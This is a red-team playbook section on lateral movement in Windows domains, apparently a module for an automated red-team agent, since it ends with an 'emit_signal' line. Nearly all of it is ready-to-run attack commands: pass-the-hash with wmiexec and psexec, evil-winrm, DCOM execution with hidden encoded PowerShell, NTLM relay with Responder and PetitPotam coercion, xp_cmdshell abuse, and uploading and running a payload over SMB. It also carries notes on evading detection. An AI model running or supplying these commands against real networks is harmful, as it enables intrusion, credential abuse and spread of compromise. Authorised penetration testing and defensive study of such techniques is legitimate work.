# RT05: Lateral Movement

**MITRE:** T1047, T1021.006, T1021.002, T1075 | **When:** Internal IPs reachable + credentials obtained.

## WMI Execution (T1047) - Low detection

```bash
# Remote command execution via WMI:
wmiexec.py corp.local/administrator:'Password!'@<TARGET_IP>
# OR with hash:
wmiexec.py -hashes :<NTLM_HASH> corp.local/administrator@<TARGET_IP>

# PowerShell WMI:
Invoke-WmiMethod -Class Win32_Process -Name Create \
  -ComputerName <TARGET> \
  -ArgumentList "powershell -nop -w hidden -enc <BASE64>"

# WMI subscription persistence (see persistence.md for details)
```

## PSExec (T1021.002) - Noisier, creates service

```bash
# psexec.py (impacket):
psexec.py corp.local/administrator:'Password!'@<TARGET_IP>
psexec.py -hashes :<NTLM_HASH> corp.local/administrator@<TARGET_IP>

# Quiet SMB copy + exec (avoid PSExec signature):
smbclient.py corp.local/administrator:'Password!'@<TARGET_IP>
# smb: \> put payload.exe \Windows\Temp\
# Then: wmiexec.py exec C:\Windows\Temp\payload.exe
```

## WinRM (T1021.006) - PowerShell Remoting

```bash
# evil-winrm (Linux):
evil-winrm -i <TARGET_IP> -u administrator -p 'Password!'
evil-winrm -i <TARGET_IP> -u administrator -H <NTLM_HASH>
evil-winrm -i <TARGET_IP> -u administrator -p 'Password!' -e /tmp/scripts/

# With Kerberos ticket:
evil-winrm -i <TARGET_IP> -u administrator -k -r corp.local

# PowerShell (Windows):
Enter-PSSession -ComputerName <TARGET> -Credential (Get-Credential)
Invoke-Command -ComputerName <TARGET> -ScriptBlock {whoami; hostname}
```

## DCOM (T1021.003) - Low detection

```bash
# MMC20.Application:
$com = [Activator]::CreateInstance([Type]::GetTypeFromProgID("MMC20.Application","<TARGET>"))
$com.Document.ActiveView.ExecuteShellCommand("powershell", $null, "-nop -w hidden -enc <BASE64>","7")

# ShellBrowserWindow:
$com = [Activator]::CreateInstance([Type]::GetTypeFromCLSID([Guid]"C08AFD90-F2A1-11D1-8455-00A0C91F3880","<TARGET>"))
$com.Document.Application.ShellExecute("powershell","-enc <BASE64>","C:\Windows\System32","","0")
```

## SMB Relay (NTLM Relay)

```bash
# Relay captured NTLM auth to target (when SMB signing disabled):
# Step 1: Start relay:
ntlmrelayx.py -tf targets.txt -smb2support -i  # interactive shell
ntlmrelayx.py -tf targets.txt -smb2support -c "powershell -enc <BASE64>"

# Step 2: Trigger NTLM auth from target machine:
# Option A: Responder (passive: wait for broadcasts)
responder -I eth0 -wrf

# Option B: PetitPotam / PrinterBug (active coercion):
PetitPotam.py <RELAY_HOST> <TARGET_IP>
python3 printerbug.py corp.local/normaluser:'Password!'@<TARGET_IP> <RELAY_HOST>

# Target selection (SMB signing check):
crackmapexec smb <SUBNET>/24 --gen-relay-list targets.txt
```

## MSSQL xp_cmdshell Lateral

```bash
# If MSSQL accessible with SA or sysadmin creds:
mssqlclient.py corp.local/sa:'Password!'@<MSSQL_IP>
# SQL> EXEC sp_configure 'show advanced options',1;RECONFIGURE;
# SQL> EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
# SQL> EXEC xp_cmdshell 'whoami';
# SQL> EXEC xp_cmdshell 'powershell -enc <BASE64>';
```

**Signal:** `emit_signal SURFACE_FOUND "Lateral movement to <host> via <method>" "main/redteam" 0.92`
